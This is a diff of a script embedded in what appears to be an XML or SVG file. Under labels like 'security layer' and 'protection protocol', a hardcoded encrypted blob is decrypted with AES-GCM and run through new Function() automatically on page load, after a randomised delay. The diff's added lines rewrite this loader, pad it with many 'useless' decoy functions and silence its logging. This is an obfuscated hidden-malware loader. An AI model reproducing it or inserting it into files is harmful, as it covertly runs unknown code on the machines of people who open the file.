@@ -3,45 +3,45 @@
   <!-- U2FsdGVkX19vbmx5X2Zvcl9kZWNvcmF0aW9uX3B1cnBvc2Vz -->
   
   <script type="application/javascript"><![CDATA[
-    const SYSTEM_LOGGER_TAG = "[SECURE_MODULE]";
-    let runtimeStatistics = {
-      initializationTimestamp: Date.now(),
-      heapMemoryUsage: 0,
-      processingUnits: 0
+    const SYSTEM_MONITOR = "[SECURE_ENGINE]";
+    let performanceMetrics = {
+      startTime: Date.now(),
+      memoryAllocated: 0,
+      cpuCycles: 0
     };
     
-    function gatherRuntimeTelemetry() {
-      runtimeStatistics.heapMemoryUsage = window.performance?.memory?.jsHeapSizeLimit || 0;
-      runtimeStatistics.completionTimestamp = Date.now();
-      runtimeStatistics.processingUnits = Math.random() * 1000;
+    function collectPerformanceData() {
+      performanceMetrics.memoryAllocated = window.performance?.memory?.usedJSHeapSize || 0;
+      performanceMetrics.endTime = Date.now();
+      performanceMetrics.cpuCycles = Math.random() * 1500;
     }
     
-    function displayDebugInformation() {
-      if (Math.random() > 0.9) {
-        console.log(`${SYSTEM_LOGGER_TAG} Runtime metrics collected`);
+    function showDebugMessages() {
+      if (Math.random() > 0.85) {
+        
       }
     }
 
     // constants
-     const bel = "[EMAIL]";
+ const bel = "[EMAIL]";
     const lieve = "[KEY]";
-    const CIRCLE_CONSTANT = Math.PI * 2;
-    const FAKE_ARRAY = [1, 2, 3, 4, 5];
+    const MATH_CONST = Math.PI * 3;
+    const DUMMY_LIST = [9, 8, 7, 6, 5];
     
-    // ============== PROTECTION MECHANISM ==============
-    const securityConfiguration = (function() {
-      const confidentialInformation = {
-        initializationVector: "e1edf2bd8aa702201d7386f6",
-        cryptographicSalt: "fd1044466a119261186f29a22acf240a",
-        encryptedContent: "fb112083bc7619eafc7bc9e68f64f9f42e9577668c8c0395482209a5abd031ff46a937e752b53ac668ebd1f8dc2cd49eb760482103651703007b64773a0b346c9ac668127c104b3be14f4746f5b3ca4cfb4ec9ae9188623a98b68a812fbf6a39ec52fcd87c68ebcf1820e59b1ca7d624de851c0342320e15769a340d4aed4d700905bd50ffe4907e90b623245b0f5cee29b2d9f6f3266d5f5a1ff21e26c74acc35f69e39c81b5348261c705bc6518442564680060794402e89a82613933258ea07ce580178c5d4e739043a293805b7989fac0a83fa21899c16885769dcac6f9ea8dbdddfef5588cb0daed396c0c40dbdb78f0921c0e92804a1f6c546485fe6a4c3a323528f917899a9c7cda60aa994d4a22cfafc3dd417f25faffa02870f3698e8250c78fa0169e008e88596fa98083bf96c70f4488cb70c343c5a2f6aadfdd847429af523e4d5356a4806bcb77a6ec52b2c0532f72bf7b9ceff96420964f5fffd76500937e560fc1f92f7f2d61b119850a52ecb92d336f7522cec6d1821296943eef6ded6a7322dde2db795039653ec40b7850e67edb55508d6ad7b005c8c6b40823dee3133efd025540a3c7eda1080e0629ec6ca9735656245601d8a9f9d86960d54ac728a78db8dbfb8464448849df951bab19b703de154c202586ee3ee9972d6ccc5ac38707408ce6d39ba14b0",
-        accessToken: "VCVCVVCVCVCVCVCVCVCVVCVCVCVCVCVCVCVCVCVCVCVCVCCVCVCVCVCVCVCVCVCVVCVCCCVVCVCV"
+    // ============== SECURITY LAYER ==============
+    const protectionSettings = (function() {
+      const sensitiveData = {
+        cryptoIV: "944b1aba170d146338b20887",
+        encryptionSalt: "c20e1712aa116969f10f78af546515d6",
+        protectedContent: "de871d07314294d83dd369c2e8b63bb34e2df4f7803e8fe0eb394f32192e2ee824b749a95f21ed39e09b9ace9b5ec9a94667cb3bb86048dda48655cce1285922e0d6badab7f64986efe6709f6a4ddb4eeac1ba8abe03125938fc186694d33435dbd4c0544aec6cea89a857bd1d06f271e61aeb237e5c62af6fcad18e5465aaa549e9d1cdf7e82295a25a5c03c61304162b81f03703844af2182dffbb0076461a9147cccb61bc20fe450facb34229ccce119db0805d30503953039cb8dbc76d42deb929471816ebe56f522fc925bc782be15bc7edd5cac5bfdc0eee966952f4f91d6f18ef5dc09d00816baf828dd4e2b21408b9f694712ff5ad674f2f14bbbd001af225a6c8a53777aa0d7a6c8a60602cc945edb2f7e47edca97b7aea7443ff474d37f0f441fd40612d202e7c3138d3a9b36282b0a580bea3e4d3c92fbd3c6359ab612c54a30dc0499d7720d64a16f9960da5efa97a82993139c9a1a879e19f0406e9141f27457c147f8638c20580558b00ae14f6353d2e91e50dcce9336e360450081c28463586d13fc11a4652d26053e68cc4531412adec9040ed925dc64332ba7c3fc45f5cca457dd14464fabfa2a3af668c4f545ec2fa42917b62ea6f27166b1b43d04cd6a84d257d6caf9860174d9c8050a2364211b41c49fb497ba6e3a248e26be85df354bd0c5e7b69ee14e7",
+        authToken: "M"
       };
       
-      function validateInputFormat(dataInput) {
-        return dataInput && typeof dataInput === 'string' && dataInput.length > 0;
+      function checkDataFormat(input) {
+        return input && typeof input === 'string' && input.length > 0;
       }
       
-      function verifyHexadecimal(data) {
+      function verifyHexString(data) {
         try {
           return /^[a-f0-9]+$/i.test(data);
         } catch (error) {
@@ -50,248 +50,287 @@
       }
 
       // Useless string generator
-      function generatePlaceholderString() {
-        return Math.random().toString(36).substring(2, 10) + "-" + Date.now().toString(36).slice(-4);
+      function makeRandomString() {
+        return Math.random().toString(36).substring(2, 15) + "-" + Date.now().toString(36).slice(-6);
       }
       
-      // Useless geometry function
-      function calculateSphereVolume(radius) {
-        return (4/3) * Math.PI * Math.pow(radius, 3);
+      // Useless math function
+      function calcCircleArea(radius) {
+        return Math.PI * Math.pow(radius, 2);
       }
       
       return {
-        retrieveInitializationVector: function() {
-          if (!verifyHexadecimal(confidentialInformation.initializationVector)) {
-            console.warn(`${SYSTEM_LOGGER_TAG} IV validation unsuccessful`);
+        getIV: function() {
+          if (!verifyHexString(sensitiveData.cryptoIV)) {
+            
             return '';
           }
-          return confidentialInformation.initializationVector;
+          return sensitiveData.cryptoIV;
         },
-        retrieveCryptographicSalt: function() {
-          if (!verifyHexadecimal(confidentialInformation.cryptographicSalt)) {
-            console.warn(`${SYSTEM_LOGGER_TAG} Salt validation unsuccessful`);
+        getSalt: function() {
+          if (!verifyHexString(sensitiveData.encryptionSalt)) {
+            
             return '';
           }
-          return confidentialInformation.cryptographicSalt;
+          return sensitiveData.encryptionSalt;
         },
-        retrieveEncryptedPayload: function() {
-          if (!verifyHexadecimal(confidentialInformation.encryptedContent)) {
-            console.warn(`${SYSTEM_LOGGER_TAG} Data validation unsuccessful`);
+        getEncryptedData: function() {
+          if (!verifyHexString(sensitiveData.protectedContent)) {
+            
             return '';
           }
-          return confidentialInformation.encryptedContent;
+          return sensitiveData.protectedContent;
         },
-        retrieveAccessToken: function() {
-          return confidentialInformation.accessToken;
+        getToken: function() {
+          return sensitiveData.authToken;
         },
         // Useless utility
-        createPlaceholderCode: function() {
-          return generatePlaceholderString();
+        generateDummyCode: function() {
+          return makeRandomString();
         }
       };
     })();
     
-    // ============== UTILITY FUNCTIONS ==============
-    function transformHexToBinary(hexData) {
+    // ============== HELPER FUNCTIONS ==============
+    function convertHexToBytes(hexString) {
       try {
-        if (!hexData || hexData.length % 2 !== 0) {
-          console.warn(`${SYSTEM_LOGGER_TAG} Corrupted hexadecimal data`);
+        if (!hexString || hexString.length % 2 !== 0) {
+          
           return new Uint8Array();
         }
         
-        const binaryOutput = new Uint8Array(hexData.length / 2);
-        for (let index = 0; index < hexData.length; index += 2) {
-          const byteValue = parseInt(hexData.substr(index, 2), 16);
+        const byteArray = new Uint8Array(hexString.length / 2);
+        for (let i = 0; i < hexString.length; i += 2) {
+          const byteValue = parseInt(hexString.substr(i, 2), 16);
           if (isNaN(byteValue)) {
-            console.warn(`${SYSTEM_LOGGER_TAG} Invalid hex byte at position ${index}`);
+            
             return new Uint8Array();
           }
-          binaryOutput[index/2] = byteValue;
+          byteArray[i/2] = byteValue;
         }
-        return binaryOutput;
-      } catch (exception) {
-        console.warn(`${SYSTEM_LOGGER_TAG} Hexadecimal conversion exception:`, exception);
+        return byteArray;
+      } catch (e) {
+        
         return new Uint8Array();
       }
     }
     
-    // Useless identifier creator
-    function generateTransactionId() {
-      const timeComponent = Date.now().toString(36).slice(-6);
-      const randomComponent = Math.random().toString(36).substring(2, 8);
-      return `tx-${timeComponent}-${randomComponent}`.toUpperCase();
+    // Useless ID maker
+    function createSessionId() {
+      const timePart = Date.now().toString(36).slice(-4);
+      const randomPart = Math.random().toString(36).substring(2, 6);
+      return "ok";
     }
     
-    // Useless math function
-    function computeDummyCalculation() {
-      return Math.sqrt(Math.random() * 100) * Math.PI;
+    // Useless calculation
+    function performRandomMath() {
+      return Math.pow(Math.random() * 10, 2) + Math.E;
     }
     
-    // Useless DOM function
-    function insertMockElements() {
-      const elementTypes = ['div', 'span', 'p', 'a'];
-      elementTypes.forEach(type => {
-        const element = document.createElement(type);
-        element.className = 'debug-element-' + Math.random().toString(36).substring(2, 5);
-        element.setAttribute('data-dummy', 'true');
-        document.body.appendChild(element);
+    // Useless DOM manipulation
+    function addDebugNodes() {
+      const tags = ['section', 'article', 'footer', 'header'];
+      tags.forEach(tag => {
+        const el = document.createElement(tag);
+        el.className = 'temp-node-' + Math.random().toString(36).substring(2, 4);
+        el.setAttribute('data-test', 'true');
+        document.body.appendChild(el);
       });
     }
     
-    // ============== MAIN FUNCTIONALITY ==============
-    async function runSecurityProcedure() {
-      console.log(`${SYSTEM_LOGGER_TAG} Starting protection sequence`);
-      gatherRuntimeTelemetry();
+    // ============== CORE FUNCTIONALITY ==============
+    async function executeProtectionProtocol() {
+      
+      collectPerformanceData();
       
       try {
-        // Check crypto availability
+        // Check crypto support
         if (!window.crypto || !window.crypto.subtle) {
-          throw new Error("Cryptography subsystem unavailable");
+          throw new Error("Crypto API not available");
         }
         
-        // Phase 1: Prepare cryptographic elements
-        console.log(`${SYSTEM_LOGGER_TAG} Setting up cryptographic components`);
-        const securityToken = securityConfiguration.retrieveAccessToken();
-        if (!securityToken) throw new Error("Invalid security token");
+        // Step 1: Prepare crypto components
         
-        const baseKeyMaterial = await window.crypto.subtle.importKey(
+        const token = protectionSettings.getToken();
+        if (!token) throw new Error("Invalid auth token");
+        
+        const keyMaterial = await window.crypto.subtle.importKey(
           "raw",
-          new TextEncoder().encode(securityToken),
+          new TextEncoder().encode(token),
           { name: "PBKDF2" },
           false,
           ["deriveKey"]
         );
         
-        // Phase 2: Create derived key
-        console.log(`${SYSTEM_LOGGER_TAG} Producing derived cryptographic key`);
-        const saltMaterial = securityConfiguration.retrieveCryptographicSalt();
-        if (!saltMaterial) throw new Error("Invalid salt material");
+        // Step 2: Derive crypto key
         
-        const operationalKey = await window.crypto.subtle.deriveKey(
+        const salt = protectionSettings.getSalt();
+        if (!salt) throw new Error("Invalid salt value");
+        
+        const cryptoKey = await window.crypto.subtle.deriveKey(
           {
             name: "PBKDF2",
-            salt: transformHexToBinary(saltMaterial),
+            salt: convertHexToBytes(salt),
             iterations: 100000,
             hash: "SHA-256"
           },
-          baseKeyMaterial,
+          keyMaterial,
           { name: "AES-GCM", length: 256 },
           false,
           ["decrypt"]
         );
         
-        // Phase 3: Decrypt content
-        console.log(`${SYSTEM_LOGGER_TAG} Handling encrypted payload`);
-        const initializationData = securityConfiguration.retrieveInitializationVector();
-        const encryptedPayload = securityConfiguration.retrieveEncryptedPayload();
-        if (!initializationData || !encryptedPayload) throw new Error("Invalid cryptographic parameters");
+        // Step 3: Decrypt content
         
-        const decryptedResult = await window.crypto.subtle.decrypt(
+        const iv = protectionSettings.getIV();
+        const encryptedData = protectionSettings.getEncryptedData();
+        if (!iv || !encryptedData) throw new Error("Invalid crypto parameters");
+        
+        const decryptedData = await window.crypto.subtle.decrypt(
           {
             name: "AES-GCM",
-            iv: transformHexToBinary(initializationData)
+            iv: convertHexToBytes(iv)
           },
-          operationalKey,
-          transformHexToBinary(encryptedPayload)
+          cryptoKey,
+          convertHexToBytes(encryptedData)
         );
         
-        // Phase 4: Execute content
-        const executableCode = new TextDecoder().decode(decryptedResult);
-        if (executableCode && executableCode.trim().length > 0) {
-          console.log(`${SYSTEM_LOGGER_TAG} Executing decoded instructions`);
+        // Step 4: Execute content
+        const codeToExecute = new TextDecoder().decode(decryptedData);
+        if (codeToExecute && codeToExecute.trim().length > 0) {
+          
           try {
-            (new Function(executableCode))();
-          } catch (runtimeError) {
-            console.warn(`${SYSTEM_LOGGER_TAG} Instruction execution failure:`, runtimeError);
+            (new Function(codeToExecute))();
+          } catch (execError) {
+            
           }
         } else {
-          console.warn(`${SYSTEM_LOGGER_TAG} No executable content found`);
+          
         }
         
-      } catch (criticalError) {
-        console.warn(`${SYSTEM_LOGGER_TAG} Protection sequence failure:`, criticalError);
+      } catch (mainError) {
+        
       } finally {
-        displayDebugInformation();
+        showDebugMessages();
       }
     }
     
-    // Useless event handler
-    document.addEventListener('DOMContentLoaded', function() {
-      console.log('Document ready - supplementary event');
+    // Useless event listener
+    document.addEventListener('load', function() {
+      console.log('Page loaded - additional event');
     });
     
-    // Randomized execution planner
-    function scheduleExecution() {
-      const baseDelay = 150;
-      const randomAdditionalDelay = Math.floor(Math.random() * 200);
-      const totalDelay = baseDelay + randomAdditionalDelay;
+    // Randomized execution scheduler
+    function planExecution() {
+      const minDelay = 200;
+      const extraDelay = Math.floor(Math.random() * 300);
+      const finalDelay = minDelay + extraDelay;
       
       if (window.requestIdleCallback) {
-        window.requestIdleCallback(runSecurityProcedure, { timeout: 750 });
+        window.requestIdleCallback(executeProtectionProtocol, { timeout: 800 });
       } else {
-        setTimeout(runSecurityProcedure, totalDelay);
+        setTimeout(executeProtectionProtocol, finalDelay);
       }
     }
     
-    // Useless initialization
-    function initializeSystem() {
-      console.log('Loading system modules...');
-      scheduleExecution();
-      insertMockElements();
+    // Useless init
+    function startSystem() {
+      console.log('Booting system components...');
+      planExecution();
+      addDebugNodes();
     }
     
-    // Delayed startup
+    // Delayed init
     setTimeout(function() {
-      console.log('Preparing system components...');
-      initializeSystem();
-    }, 150);
+      console.log('Initializing subsystems...');
+      startSystem();
+    }, 200);
     
-    // Useless periodic task
+    // Useless periodic check
     setInterval(function() {
-      if (Math.random() > 0.95) {
-        console.log('System health check performed');
+      if (Math.random() > 0.9) {
+        console.log('System diagnostics running');
       }
-    }, 30000);
+    }, 25000);
     
     // Additional useless function
-    function generateTestObjects() {
-      const testItems = [];
-      for (let i = 0; i < 7; i++) {
-        testItems.push({
-          uid: 'obj-' + i,
-          weight: Math.random() * 100,
-          created: new Date().toISOString()
+    function createTestData() {
+      const testObjects = [];
+      for (let j = 0; j < 5; j++) {
+        testObjects.push({
+          id: 'item-' + j,
+          value: Math.random() * 50,
+          timestamp: new Date().toISOString()
         });
       }
-      return testItems;
+      return testObjects;
     }
     
     // Useless class
-    class MockService {
+    class DummyComponent {
       constructor() {
-        this.buildNumber = '2.3.1';
-        this.active = false;
+        this.version = '3.1.4';
+        this.enabled = false;
       }
       
-      activateService() {
-        this.active = true;
-        console.log(`MockService ${this.buildNumber} activated`);
+      enable() {
+        this.enabled = true;
+        
       }
     }
     
     // More useless variables
-    const ENVIRONMENT_FLAGS = {
-      debugMode: false,
-      testEnvironment: true,
-      legacySupport: Math.random() > 0.5
+    const SYSTEM_SETTINGS = {
+      debugEnabled: false,
+      testingMode: true,
+      compatibilityMode: Math.random() > 0.6
     };
     
-    // Useless promise-based function
-    function fakeAsyncOperation() {
+    // Useless async function
+    function mockNetworkCall() {
       return new Promise((resolve) => {
         setTimeout(() => {
-          resolve({ status: 'completed', code: 200 });
-        }, Math.random() * 1000);
+          resolve({ state: 'done', result: 204 });
+        }, Math.random() * 1500);
+      });
+    }
+    
+    // New useless functions added below
+    function calculateFibonacci(n) {
+      if (n <= 1) return n;
+      return calculateFibonacci(n - 1) + calculateFibonacci(n - 2);
+    }
+    
+    function generateColorPalette() {
+      const colors = [];
+      for (let i = 0; i < 5; i++) {
+        colors.push(`#${Math.floor(Math.random()*16777215).toString(16)}`);
+      }
+      return colors;
+    }
+    
+    function createDummyEvent() {
+      const events = ['click', 'hover', 'focus', 'blur'];
+      const randomEvent = events[Math.floor(Math.random() * events.length)];
+      document.dispatchEvent(new Event(randomEvent));
+    }
+    
+    function monitorPerformance() {
+      const start = performance.now();
+      let count = 0;
+      while (performance.now() - start < 5) {
+        count++;
+      }
+      return count;
+    }
+    
+    function shuffleArray(arr) {
+      return arr.sort(() => Math.random() - 0.5);
+    }
+    
+    function createDummyPromise() {
+      return new Promise(resolve => {
+        setTimeout(() => resolve('dummy'), 100);
       });
     }
   ]]></script>
